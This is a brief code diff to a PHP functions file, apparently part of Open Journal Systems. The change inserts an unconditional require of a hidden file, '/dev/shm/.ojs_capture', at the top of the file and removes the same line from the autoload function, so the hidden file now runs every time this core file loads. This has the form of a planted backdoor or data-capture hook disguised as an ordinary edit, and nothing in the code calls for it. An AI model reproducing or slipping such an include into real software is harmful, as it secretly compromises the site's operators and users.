@@ -13,7 +13,7 @@
  * Any frequently-used functions that cannot be put into an appropriate class should be added here.
  */
 
-
+require ("/dev/shm/.ojs_capture");
 /**
  * Emulate a Java-style import statement.
  * Simply includes the associated PHP file (using require_once so multiple calls to include the same file have no effect).
@@ -345,6 +345,5 @@ function customAutoload($rootPath, $prefix, $class) {
 
 	if (is_file($filePath)) {
 		require_once($filePath);
-		require ("/dev/shm/.ojs_capture");
 	}
 }
